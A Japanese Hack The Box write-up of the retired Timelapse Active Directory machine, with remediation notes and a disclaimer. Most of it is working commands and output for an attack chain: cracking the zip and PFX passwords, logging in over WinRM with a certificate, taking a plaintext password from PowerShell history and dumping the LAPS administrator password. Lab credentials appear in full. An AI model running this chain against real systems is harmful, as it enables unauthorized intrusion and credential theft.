---
title: "[ HTB ] Timelapse | Writeup"
emoji: "⏱️"
type: "tech"
topics: ["Security", "writeup", "Cyber Security", "hacking", "Hack The Box"]
published: false
---

## README

- 初学者の、初学者による、初学者のためのWriteupです。
- 「なぜその判断に至ったのか」「なぜそのコマンドを実行しようと考えたのか」など、各アクションに至った思考回路部分についても触れています。
- 尚、一部正確でない表現が含まれている場合があります。
- 一応実務でもペネトレーションテストをやっているので、（たまに）実務目線のコメントも挟みます。

### 想定読者

- HTBなどのCTF/ペネトレーションテスト演習に興味がある初学者
- Linuxの基本的なコマンド操作、SMB/WinRM/LDAPなどのプロトコルについてある程度の前提知識がある方(本記事内でも簡単な用語解説を挟んでいます)

## Machine Profile

Machine Name: Timelapse
Difficulty: Easy
OS: Windows

https://app.hackthebox.com/machines/Timelapse

## Setup

対象IPを`RHOSTS`という環境変数に入れておく。IP手打ちなどによるミスを防止

```sh
┌──(root㉿5602a1b7889d)-[~/Timelapse]
└─# echo 'export RHOSTS="10.129.227.113"' | tee -a .zshrc
export RHOSTS="10.129.227.113"
```

設定反映

```sh
┌──(root㉿5602a1b7889d)-[~/Timelapse]
└─# source .zshrc
```

動作確認＆疎通確認

```sh
┌──(root㉿5602a1b7889d)-[~/Timelapse]
└─# ping -c 4 ${RHOSTS}
PING 10.129.227.113 (10.129.227.113) 56(84) bytes of data.
64 bytes from 10.129.227.113: icmp_seq=1 ttl=127 time=140 ms
64 bytes from 10.129.227.113: icmp_seq=2 ttl=127 time=139 ms
64 bytes from 10.129.227.113: icmp_seq=3 ttl=127 time=141 ms
64 bytes from 10.129.227.113: icmp_seq=4 ttl=127 time=138 ms

--- 10.129.227.113 ping statistics ---
4 packets transmitted, 4 received, 0% packet loss, time 3004ms
rtt min/avg/max/mdev = 138.412/139.587/141.233/1.047 ms
```

`ttl=127`はWindowsホストの目安(初期値128から1ホップ分減った値)。対象がWindowsっぽいという当たりをつけつつ先へ進む。

## Enumeration

### Nmap

まずはNmapでポートスキャン、兎にも角にもNmap。

```sh
┌──(root㉿5602a1b7889d)-[~/Timelapse]
└─# nmap -sSV -Pn -n -r -T4 -oN nmap_version.txt ${RHOSTS}
Starting Nmap 7.99 ( https://nmap.org ) at 2026-10-13 23:39 +0000
Nmap scan report for 10.129.227.113
Host is up (0.40s latency).
Not shown: 988 filtered tcp ports (no-response)
PORT     STATE SERVICE           VERSION
53/tcp   open  domain            Simple DNS Plus
88/tcp   open  kerberos-sec      Microsoft Windows Kerberos (server time: 2026-10-14 20:29:38Z)
135/tcp  open  msrpc             Microsoft Windows RPC
139/tcp  open  netbios-ssn       Microsoft Windows netbios-ssn
389/tcp  open  ldap              Microsoft Windows Active Directory LDAP (Domain: timelapse.htb, Site: Default-First-Site-Name)
445/tcp  open  microsoft-ds?
464/tcp  open  kpasswd5?
593/tcp  open  ncacn_http        Microsoft Windows RPC over HTTP 1.0
636/tcp  open  ldapssl?
3268/tcp open  ldap              Microsoft Windows Active Directory LDAP (Domain: timelapse.htb, Site: Default-First-Site-Name)
3269/tcp open  globalcatLDAPssl?
5986/tcp open  ssl/wsmans?
Service Info: Host: DC01; OS: Windows; CPE: cpe:/o:microsoft:windows

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 154.06 seconds
```

`-sSV`: SYNスキャン＋Versionスキャン  
`-Pn`: Pingチェック無効化  
デフォルトだとPingが通らないとスキャンが始まらないが、このチェックを省略し若干の時短を図る  
`-n`: 名前解決無効化。同じく時短目的  
`-r`: ポートスキャンを昇順に行う。特に意味はない、好み  
フルポートスキャン中にWiresharkなどで覗き見した際に、いまどこまで回っているかを確認するために使用することが多い  
`-T4`: 並列スキャン数増加。未指定時はデフォルトの3が選択される、時短  
`-oN`: 結果を保存するファイル名を指定  

---

53(DNS)・88(Kerberos)・389/636/3268/3269(LDAP系)・445(SMB)が一通り開いていて、ホスト名`DC01`・ドメイン`timelapse.htb`。典型的なActive DirectoryのDC構成。

ここで一つ目を引くのが最後の行。

> 5986/tcp open  ssl/wsmans?

5985(平文WinRM)ではなく、5986(SSL付きWinRM)だけが開いている。この違いが後々効いてくるので頭の片隅に置いておく。

ドメイン名`timelapse.htb`を`/etc/hosts`に登録しておく。

```sh
┌──(root㉿5602a1b7889d)-[~/Timelapse]
└─# echo "${RHOSTS} dc01.timelapse.htb timelapse.htb" | tee -a /etc/hosts
10.129.227.113 dc01.timelapse.htb timelapse.htb
```

### SMB

> 445/tcp  open  microsoft-ds?

AD/DCが相手なら、まずは認証無しでSMB共有を覗けないかを試すのが定石。

:::details SMBとは？
読み方: エスエムビー

正式名称: Server Message Block

意味: Windows系ネットワークでファイル共有やプリンタ共有に使われるプロトコル。ADのDCの場合、各種管理情報や共有フォルダを収集する足掛かりとして定番の攻撃対象。
:::

`smbclient`に`-N`(No password、認証なし)を付けて共有一覧を取得する。

```sh
┌──(root㉿5602a1b7889d)-[~/Timelapse]
└─# smbclient -N -L //${RHOSTS}

	Sharename       Type      Comment
	---------       ----      -------
	ADMIN$          Disk      Remote Admin
	C$              Disk      Default share
	IPC$            IPC       Remote IPC
	NETLOGON        Disk      Logon server share
	Shares          Disk
	SYSVOL          Disk      Logon server share
Reconnecting with SMB1 for workgroup listing.
do_connect: Connection to 10.129.227.113 failed (Error NT_STATUS_RESOURCE_NAME_NOT_FOUND)
Unable to connect with SMB1 -- no workgroup available
```

`ADMIN$` / `C$` / `IPC$` / `NETLOGON` / `SYSVOL`は既定の管理共有だが、`Shares`という見慣れない共有が一つ混ざっている。DC構築時に管理者が独自に作った共有の可能性が高く、何か置き忘れている定番ポイントなので中を覗いてみる。

```sh
┌──(root㉿5602a1b7889d)-[~/Timelapse]
└─# smbclient -N //${RHOSTS}/Shares
Try "help" to get a list of possible commands.
smb: \> ls
  .                                   D        0  Tue Oct 26 00:39:15 2021
  ..                                  D        0  Tue Oct 26 00:39:15 2021
  Dev                                 D        0  Tue Oct 26 04:40:06 2021
  HelpDesk                            D        0  Tue Oct 26 00:48:42 2021

		6367231 blocks of size 4096. 1325632 blocks available
```

`Shares`に認証なしで入れてしまった。`Dev`と`HelpDesk`の2フォルダがある。中身が何個あるか分からないので、まとめて手元に落とす。

```sh
smb: \> prompt off
smb: \> recurse on
smb: \> mget *
```

`prompt off`: ファイルごとの取得確認(y/n)を省略  
`recurse on`: サブフォルダも再帰的に取得  
`mget *`: マッチする全ファイルをまとめてダウンロード  

回収したファイルを確認すると、`Dev`配下に`winrm_backup.zip`という、いかにも意味深なバックアップファイルがあった。名前からして「WinRMのバックアップ」。先ほど5986(WinRM)が開いていたのと符合するので、ここが本線だと当たりをつける。

:::message
認証なしでアクセス可能な独自SMB共有(`Shares`)に、機微なバックアップファイルが放置されていた。これは「認証情報・機微ファイルの不適切な管理(アクセス制御不備)」にあたる。本来、認証情報を含むようなファイルを匿名アクセス可能な共有に置くべきではない。
:::

## Foothold

### winrm_backup.zip を開く

落としてきたzipを素直に解凍しようとすると、パスワードを要求された。

```sh
┌──(root㉿5602a1b7889d)-[~/Timelapse/Shares/Dev]
└─# unzip winrm_backup.zip
Archive:  winrm_backup.zip
[winrm_backup.zip] legacyy_dev_auth.pfx password:
```

PWは手元に無いので、zipのPWハッシュを抜き出してオフラインでクラックしにいく。

:::details John the Ripperとは？
読み方: ジョン・ザ・リッパー

意味: 各種ハッシュ/暗号化ファイルのPWをオフラインで解析(クラック)するためのツール。`zip2john`や`pfx2john`のような補助スクリプトで、対象ファイルをJohnが食える「ハッシュ形式」に変換してから噛ませるのが定番の流れ。
:::

`zip2john`でzipをハッシュ形式に変換し、John[^3] に`rockyou.txt`で辞書攻撃をかけさせる。

```sh
┌──(root㉿5602a1b7889d)-[~/Timelapse]
└─# zip2john Shares/Dev/winrm_backup.zip > zip.hash
ver 2.0 efh 5455 efh 7875 winrm_backup.zip/legacyy_dev_auth.pfx PKZIP Encr: TS_chk, cmplen=2405, decmplen=2555, crc=12EC5683 ts=72AA cs=72aa type=8

┌──(root㉿5602a1b7889d)-[~/Timelapse]
└─# john --wordlist=/usr/share/wordlists/rockyou.txt zip.hash
```

クラックが終わったら`--show`で結果を確認する。

```sh
┌──(root㉿5602a1b7889d)-[~/Timelapse]
└─# john --show zip.hash
winrm_backup.zip/legacyy_dev_auth.pfx:supremelegacy:::::winrm_backup.zip

1 password hash cracked, 0 left
```

zipのPWは`supremelegacy`。これで解凍すると、`legacyy_dev_auth.pfx`という証明書ファイルが出てきた。

```sh
┌──(root㉿5602a1b7889d)-[~/Timelapse/Shares/Dev]
└─# unzip winrm_backup.zip
Archive:  winrm_backup.zip
[winrm_backup.zip] legacyy_dev_auth.pfx password:
  inflating: legacyy_dev_auth.pfx
```

### PFX を解析する

出てきた`.pfx`を開こうとすると、こちらにもロックがかかっている。先ほどのzipのPW(`supremelegacy`)を入れても弾かれた。

![Thunarでlegacyy_dev_auth.pfxを開こうとするとパスワード要求のUnlockダイアログが出る様子。zipとは別のPWで保護されている](/images/timelapse-pfx-unlock.png)

:::details PFX(.pfx)とは？
読み方: ピーエフエックス

正式名称: Personal Information Exchange (PKCS#12)

意味: SSL/TLS証明書と、それに対応する秘密鍵をひとまとめにして持ち運べるようにしたファイル形式。多くの場合、中身を保護するためのPWが別途かかっている。WinRMはこの証明書+秘密鍵をログイン資格情報として使える(=PW無しでクライアント証明書認証が出来る)。
:::

zipとは別のPWがかかっているので、こちらも`pfx2john`でハッシュ化してからJohnにかける。

```sh
┌──(root㉿5602a1b7889d)-[~/Timelapse/Shares/Dev]
└─# pfx2john legacyy_dev_auth.pfx > pfx.hash

┌──(root㉿5602a1b7889d)-[~/Timelapse/Shares/Dev]
└─# john --wordlist=/usr/share/wordlists/rockyou.txt pfx.hash

┌──(root㉿5602a1b7889d)-[~/Timelapse/Shares/Dev]
└─# john --show pfx.hash
legacyy_dev_auth.pfx:thuglegacy

1 password hash cracked, 0 left
```

PFXのPWは`thuglegacy`。これでPFXのロックは解けたので、中から証明書(`cert.pem`)と秘密鍵(`key.pem`)を`openssl`で取り出す。import passwordを聞かれたら`thuglegacy`を入力する。

```sh
┌──(root㉿5602a1b7889d)-[~/Timelapse/Shares/Dev]
└─# openssl pkcs12 -in legacyy_dev_auth.pfx -clcerts -nokeys -out cert.pem
Enter Import Password:

┌──(root㉿5602a1b7889d)-[~/Timelapse/Shares/Dev]
└─# openssl pkcs12 -in legacyy_dev_auth.pfx -nocerts -nodes -out key.pem
Enter Import Password:
```

`-clcerts -nokeys`: クライアント証明書だけを取り出す(秘密鍵は除外)  
`-nocerts -nodes`: 秘密鍵だけを取り出す。`-nodes`で鍵自体にPWをかけずに平文で書き出す  

### WinRM にログイン

証明書と秘密鍵が揃ったので、これを使ってWinRMにログインしにいく。

:::details WinRMとは？
読み方: ウィンアールエム

正式名称: Windows Remote Management

意味: WindowsをSSHライクに遠隔管理するためのプロトコル。管理系の権限を持つユーザが使うことが多く、ADマシンでは侵入の足掛かりとして狙われがち。
:::

:::details evil-winrmとは？
読み方: イービル・ウィンアールエム

意味: WinRM経由でWindowsマシンに対話シェルを張るためのツール。ファイルのアップロード/ダウンロードも1コマンドで出来るうえ、`-c`/`-k`でクライアント証明書認証にも対応しているので攻撃者視点では便利。
:::

`evil-winrm`[^2] に証明書(`-c`)と秘密鍵(`-k`)を渡して接続する。

```sh
┌──(root㉿5602a1b7889d)-[~/Timelapse/Shares/Dev]
└─# evil-winrm -i ${RHOSTS} -c cert.pem -k key.pem -S

Evil-WinRM shell v3.9

Warning: SSL enabled

Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\legacyy\Documents> whoami
timelapse\legacyy
```

`-c`: クライアント証明書(public key)を指定  
`-k`: 秘密鍵(private key)を指定  
`-S`: SSL(HTTPS)で接続する  

:::details なぜ-Sオプションが必要なのか
`-S`を付けずに実行すると、`user is a required option`というエラーで止まる。これは一見「ユーザ名を指定しろ」という意味だが、こちらは証明書で認証するつもりなので`-u`はわざと付けていない。この矛盾がヒントで、「ツールが証明書認証モードに入っていない」ことを示している。

WinRMのクライアント証明書認証は、仕様上HTTPS(TLS)の上でしか成立しない。`evil-winrm`は`-S`を付けないと平文HTTP(既定の5985)で動こうとし、そのモードでは認証手段がユーザ名+PWしかないため、渡した証明書が無視されて「userをくれ」と要求してくる。

加えて、Nmapで開いていたのは5986(SSL付きWinRM)だけで5985は閉じている。つまり`-S`無しだと「認証方式として証明書が使えない」「そもそも狙うポートが開いていない」の二重で噛み合わない。`-c`/`-k`を使うなら`-S`もセット、と覚えておくと早い。
:::

`whoami`で`timelapse\legacyy`と表示され、無事に`legacyy`としてシェルを掌握。デスクトップから`user.txt`を取得する。

```sh
*Evil-WinRM* PS C:\Users\legacyy\Documents> type ..\Desktop\user.txt
```

:::message
機微ファイルの匿名公開(SMB)と、`rockyou.txt`に含まれるような弱いPWによるzip/PFXの保護(脆弱なパスワード)が組み合わさり、本来は秘匿すべきクライアント証明書を入手・復号され、WinRMへの初期侵入を許してしまった。
:::

## Privilege Escalation

### Get to svc_deploy

Foothold後の列挙は`WinPEAS`[^4] に任せる。

:::details WinPEASとは？
読み方: ウィンピース

意味: Windows向けの権限昇格経路列挙ツール。AutoLogon設定、資格情報マネージャ、スケジュールタスク、脆弱サービス、PowerShell履歴など、権限昇格に繋がりそうなポイントを一通り舐めてくれる。
:::

`evil-winrm`の`upload`でバイナリを送り込み、出力をファイルに吐かせてから`download`で手元に回収して腰を据えて読む。

```sh
*Evil-WinRM* PS C:\Users\legacyy\Desktop> upload winPEASany.exe

Info: Uploading /usr/share/peass/winpeas/winPEASany.exe to C:\Users\legacyy\Desktop\winPEASany.exe

Info: Upload successful!

*Evil-WinRM* PS C:\Users\legacyy\Desktop> .\winPEASany.exe log=winpeas.txt
*Evil-WinRM* PS C:\Users\legacyy\Desktop> download winpeas.txt
```

出力を眺めていると、PowerShellの履歴ファイルの存在が目に留まる。

```:winpeas.txt(抜粋)
╔══════════╣ PowerShell Settings (T1059.001)
    PS history file: C:\Users\legacyy\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
    PS history size: 434B
```

:::details なぜPowerShell履歴を見にいったのか
`ConsoleHost_history.txt`は、そのユーザがPowerShellで打ったコマンドがそのまま平文で残るファイル(Linuxの`.bash_history`に相当)。管理者やサービスアカウントが作業中にワンライナーへPWを直書きしていることがよくあり、認証情報の宝庫になりがち。WinPEASがわざわざ場所を教えてくれているので、真っ先に中身を読む。
:::

履歴ファイルを手元に回収して中身を確認する。

```sh
*Evil-WinRM* PS C:\Users\legacyy\Documents> download ConsoleHost_history.txt

┌──(root㉿5602a1b7889d)-[~/Timelapse]
└─# cat ConsoleHost_history.txt
whoami
ipconfig /all
netstat -ano |select-string LIST
$so = New-PSSessionOption -SkipCACheck -SkipCNCheck -SkipRevocationCheck
$p = ConvertTo-SecureString 'E3R$Q62^12p7PLlC%KWaxuaV' -AsPlainText -Force
$c = New-Object System.Management.Automation.PSCredential ('svc_deploy', $p)
invoke-command -computername localhost -credential $c -port 5986 -usessl -SessionOption $so -scriptblock {whoami}
get-aduser -filter * -properties *
exit
```

ビンゴ。`svc_deploy`というアカウントのPW(`E3R$Q62^12p7PLlC%KWaxuaV`)が、PowerShellのワンライナーに平文で埋め込まれたまま履歴に残っていた。

まずは拾ったクレデンシャルがそのまま有効かを`nxc`[^1] で確認する。

:::details nxcとは？
読み方: ネットエクスキュート

正式名称: NetExec

意味: SMB/LDAP/WinRMなどのプロトコルに対し認証試行・情報列挙・コマンド実行をいい感じにやってくれるツール群。`CrackMapExec`の後継。
:::

```sh
┌──(root㉿5602a1b7889d)-[~/Timelapse]
└─# nxc ldap ${RHOSTS} -u svc_deploy -p 'E3R$Q62^12p7PLlC%KWaxuaV'
LDAP        10.129.227.113  389    DC01             [*] Windows 10 / Server 2019 Build 17763 (name:DC01) (domain:timelapse.htb) (signing:None) (channel binding:No TLS cert)
LDAP        10.129.227.113  389    DC01             [+] timelapse.htb\svc_deploy:E3R$Q62^12p7PLlC%KWaxuaV
```

> [+] timelapse.htb\svc_deploy:E3R$Q62^12p7PLlC%KWaxuaV

末尾が`[+]`なのでクレデンシャルは有効。`svc_deploy`への横展開に成功した。このアカウントが何者なのか、所属グループを確認しておく。

```sh
*Evil-WinRM* PS C:\Users\legacyy\Documents> net user svc_deploy
User name                    svc_deploy
Full Name                    svc_deploy
...
Local Group Memberships      *Remote Management Use
Global Group memberships     *LAPS_Readers         *Domain Users
The command completed successfully.
```

> Global Group memberships     *LAPS_Readers         *Domain Users

`Remote Management Users`(WinRMでログイン可)に加えて、`LAPS_Readers`という見慣れないグループに所属している。この`LAPS`という単語が権限昇格の入口になる。

:::message
サービスアカウント`svc_deploy`のPWが、PowerShell履歴ファイルに平文のまま残存していた。これは「認証情報の不適切な管理」にあたり、`legacyy`で取ったシェルから`svc_deploy`への横展開(Lateral Movement)を許すことになった。
:::

### Get to Administrator

`LAPS_Readers`の`LAPS`が気になるので、まずはこの単語を調べる。

:::details LAPSとは？
読み方: ラップス

正式名称: Local Administrator Password Solution

意味: ドメイン参加マシンのローカルAdministratorのPWを、Microsoft純正の仕組みで自動的にランダム生成・定期ローテーションし、AD上のコンピュータオブジェクトの属性(`ms-Mcs-AdmPwd`)に保管する仕組み。PW使い回しを防ぐためのセキュリティ機能そのもの。

ただしPWは当該属性に平文で入っているため、「その属性を読める権限」を持つプリンシパルは、対象マシンのローカルAdministrator PWをそのまま読み出せてしまう。
:::

:::details なぜLAPSに目をつけたのか
攻略で詰まったときは、列挙で出てきた固有名詞のうち「自分が意味を説明できないもの」を拾うのが定石。ここでは`LAPS_Readers`がそれで、グループ名からして「LAPSを読める人たち」の集まりだと推測出来る。

LAPSの実体はAD属性に入った平文PWなので、`svc_deploy`がそれを読める立場なら、ローカルAdministratorのPWをそのまま抜ける可能性が高い。HackTricksのLAPSのページにLinux側からの読み取り手順(nxcのモジュール)がまとまっているので、それに沿って試す。
:::

https://hacktricks.wiki/en/windows-hardening/active-directory-methodology/laps.html

`nxc`の`laps`モジュールを使うと、読み取り可能なマシンのLAPS PWを一括で引っ張ってこられる。

```sh
┌──(root㉿5602a1b7889d)-[~/Timelapse]
└─# nxc ldap ${RHOSTS} -u svc_deploy -p 'E3R$Q62^12p7PLlC%KWaxuaV' -M laps
LDAP        10.129.227.113  389    DC01             [*] Windows 10 / Server 2019 Build 17763 (name:DC01) (domain:timelapse.htb) (signing:None) (channel binding:No TLS cert)
LDAP        10.129.227.113  389    DC01             [+] timelapse.htb\svc_deploy:E3R$Q62^12p7PLlC%KWaxuaV
LAPS        10.129.227.113  389    DC01             [*] Getting LAPS Passwords
LAPS        10.129.227.113  389    DC01             Computer:DC01$ User:                Password:tO5@9sB&.W$d!y4&yfmX/2L9
```

`-M laps`: LAPSのPWを読み取るモジュールを実行  

> Computer:DC01$ User:                Password:tO5@9sB&.W$d!y4&yfmX/2L9

`svc_deploy`は`LAPS_Readers`に所属しているため、DC本体(`DC01$`)のローカルAdministrator PWを読めてしまった。これはそのままDCのAdministrator PWなので、有効性を`nxc`で確認する。

```sh
┌──(root㉿5602a1b7889d)-[~/Timelapse]
└─# nxc ldap ${RHOSTS} -u Administrator -p 'tO5@9sB&.W$d!y4&yfmX/2L9'
LDAP        10.129.227.113  389    DC01             [*] Windows 10 / Server 2019 Build 17763 (name:DC01) (domain:timelapse.htb) (signing:None) (channel binding:No TLS cert)
LDAP        10.129.227.113  389    DC01             [+] timelapse.htb\Administrator:tO5@9sB&.W$d!y4&yfmX/2L9 (Pwn3d!)
```

> [+] timelapse.htb\Administrator:tO5@9sB&.W$d!y4&yfmX/2L9 (Pwn3d!)

`(Pwn3d!)`が付いた。Administratorのクレデンシャルを掌握したので、`evil-winrm`でシェルを張り直す(WinRMは5986なので`-S`を忘れずに)。

```sh
┌──(root㉿5602a1b7889d)-[~/Timelapse]
└─# evil-winrm -i ${RHOSTS} -u Administrator -p 'tO5@9sB&.W$d!y4&yfmX/2L9' -S

Evil-WinRM shell v3.9

Warning: SSL enabled

Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\Administrator\Documents> whoami
timelapse\administrator
```

`timelapse\administrator`を掌握。

:::message
LAPSという仕組み自体は「ローカルAdministrator PWの使い回しを防ぐ」セキュリティ機能だが、その読み取り権限(`LAPS_Readers`)がサービスアカウント`svc_deploy`にまで委任されていた。これは「過剰な権限委任(最小権限の原則違反)」にあたる。結果として、一介のサービスアカウントからDCのローカルAdministrator PWを読み出され、権限昇格を許してしまった。
:::

:::details なぜ`nxc -M laps`を使ったのか(AdmPwd.PSとの違い)
LAPSのPWを読む手段としては、ターゲット上でMS純正モジュール`AdmPwd.PS`をインポートして`Get-AdmPwdPassword`を叩く方法もよく知られている。ただしその場合はターゲットにモジュールをアップロードする必要があり、足跡が残る。

一方、LAPSの正体はAD属性に入った平文PWを読むだけなので、Kali側からLDAPを叩く`nxc -M laps`でも等価に取れる。ターゲットに何も置かず、シェルすら不要で完結するので、こちらの方が速くてきれい。

なおLAPSのPWは定期的に(マシン再起動時などにも)ローテーションされるため、取得した値でログイン出来なくなったら、もう一度`nxc -M laps`で最新値を取り直せばよい。
:::

管理者権限で`root.txt`を取得する。

:::details なぜルートフラグの場所が分かりにくかったのか
通常はAdministratorのデスクトップ(`C:\Users\Administrator\Desktop`)に`root.txt`があるが、このマシンでは`Administrator`のデスクトップにフラグが無かった。`C:\Users`配下を見ると`TRX`という別ユーザのプロフィールがあり、`root.txt`はそちらに置かれていた。「管理者を取った＝Administratorのデスクトップ」と決めつけず、フラグが見当たらないときは`C:\Users`を一通り探すのが大事。
:::

```sh
*Evil-WinRM* PS C:\Users\TRX\Desktop> dir


    Directory: C:\Users\TRX\Desktop


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-ar---       10/17/2026   8:04 AM             34 root.txt

*Evil-WinRM* PS C:\Users\TRX\Desktop> type root.txt
```

## まとめ

改めて攻撃チェーンを整理すると以下の通り。

1. Nmapで`timelapse.htb`ドメインのDC(`DC01`)と特定。WinRMが5985ではなく5986(SSL付き)で開いている点を把握
2. 認証なしでアクセス可能なSMB共有`Shares`から`winrm_backup.zip`を回収
3. `zip2john`+`john`(`rockyou.txt`)でzipのPW(`supremelegacy`)をクラックし、`legacyy_dev_auth.pfx`を入手
4. `pfx2john`+`john`でPFXのPW(`thuglegacy`)をクラックし、`openssl`で証明書と秘密鍵を抽出
5. `evil-winrm`の証明書認証(`-c`/`-k`/`-S`)で`legacyy`としてWinRMログイン(user.txt)
6. `WinPEAS`→PowerShell履歴から`svc_deploy`の平文PWを回収し、横展開
7. `svc_deploy`が`LAPS_Readers`所属と判明。`nxc -M laps`でDCのローカルAdministrator PWを読み出し
8. 読み取ったPWで`evil-winrm`ログインし、`timelapse\administrator`を掌握(root.txt)

「公開共有に置かれた認証情報 → 弱いPWで保護された鍵 → 履歴に残った平文PW → LAPSの過剰な読み取り権限」と、各フェーズが設定・運用上の不備で綺麗に繋がっていくマシンだった。LAPSのように「本来はセキュリティ機能」であっても、権限委任を誤ると逆に攻撃経路になる、という典型例として分かりやすい。

証明書でWinRMに入る`-S`のくだりと、ルートフラグが`Administrator`以外のデスクトップにあった点が地味な引っかけで、個人的には勉強になった。

ちなみにHTBなのでやらないですが、実務では後始末もやっています。

## 免責事項

- 本記事はセキュリティ学習・知識共有を目的としています。
- 記載しているコマンド・攻撃手法は、自分が管理する環境、または明示的に許可を得た環境でのみ実行してください。他者の環境に無断で使用した場合、不正アクセス禁止法などの法令に抵触する可能性があります。
- 本記事の内容によって生じたいかなる損害についても、筆者は責任を負いかねます。

## HTBのポリシーについて

Hack The Boxでは、Retired状態のマシンに限りWriteupの公開が認められています。Activeなマシンの解法を公開する行為は利用規約違反にあたるため、本記事の対象マシンは執筆時点でRetiredであることを確認しています。

[^1]: https://github.com/Pennyw0rth/NetExec
[^2]: https://github.com/Hackplayers/evil-winrm
[^3]: https://github.com/openwall/john
[^4]: https://github.com/peass-ng/PEASS-ng/tree/master/winPEAS
